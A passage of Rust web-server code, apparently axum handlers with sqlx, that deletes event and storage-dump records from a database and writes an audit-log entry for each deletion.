    )
    .bind(uuid::Uuid::new_v4().to_string())
    .bind("dashboard")
    .bind("delete")
    .bind("events")
    .bind(None::<String>)
    .bind(None::<String>)
    .bind("")
    .bind(chrono::Utc::now().timestamp())
    .execute(&state.pool).await;
    Ok(StatusCode::NO_CONTENT)
}

pub async fn delete_storage(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> Result<StatusCode, StatusCode> {
    let row: Option<(String,)> = sqlx::query_as("SELECT session_id FROM storage_dumps WHERE id = ?")
        .bind(&id).fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    if let Some((session_id,)) = row {
        sqlx::query("DELETE FROM storage_dumps WHERE id = ?").bind(&id)
            .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let _ = sqlx::query(
            "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
        )
        .bind(uuid::Uuid::new_v4().to_string())
        .bind("dashboard")
        .bind("delete")
        .bind("storage")
        .bind(&id)
        .bind(&session_id)
        .bind("")
        .bind(chrono::Utc::now().timestamp())
        .execute(&state.pool).await;
        Ok(StatusCode::NO_CONTENT)
    } else {
        Err(StatusCode::NOT_FOUND)
    }
}

pub async fn delete_all_storage(State(state): State<Arc<AppState>>) -> Result<StatusCode, StatusCode> {
    sqlx::query("DELETE FROM storage_dumps")
        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let _ = sqlx::query(
        "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(uuid::Uuid::new_v4().to_string())
    .bind("dashboard")
    .bind("delete")
    .bind("storage")
    .bind(None::<String>)
    .bind(None::<String>)
    .bind("")
    .bind(chrono::Utc::now().timestamp())
    .execute(&state.pool).await;
    Ok(StatusCode::NO_CONTENT)
}
